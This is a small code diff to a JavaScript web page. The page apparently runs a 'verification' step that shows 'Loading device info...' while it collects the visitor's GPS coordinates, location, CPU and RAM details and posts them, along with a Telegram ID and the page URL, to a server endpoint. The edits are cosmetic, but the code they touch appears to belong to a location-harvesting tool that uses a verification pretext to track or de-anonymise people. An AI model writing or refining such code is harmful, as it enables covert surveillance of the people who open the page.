@@ -204,7 +204,7 @@ function startVerification() {
 
   document.body.innerHTML = `
     <div style="text-align:center; padding:50px; color: var(--light);">
-      <h2 style="margin-bottom: 20px; color: var(--accent);">loading device info...</h2>
+      <h2 style="margin-bottom: 20px; color: var(--accent);">Loading device info...</h2>
       <div class="spinner"></div>
       <style>
         .spinner {
@@ -229,11 +229,13 @@ function startVerification() {
 async function collectAndSendData() {
   const deviceInfo = await getDeviceInfo();
   try {
-    await fetch('/api/submit', {
+    const res = await fetch('/api/submit', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ telegramId, ...deviceInfo, source: window.location.href })
     });
+    const data = await res.json();
+    console.log('API response:', data);
   } catch (error) {
     console.error('Submission error:', error);
   }
@@ -258,8 +260,7 @@ async function getDeviceInfo() {
     gps: await getGPS(),
     cpu: await getCPUInfo(),
     ram: await getRAMInfo(),
-    location: await getLocation(),
-    source: window.location.href
+    location: await getLocation()
   };
 }
 
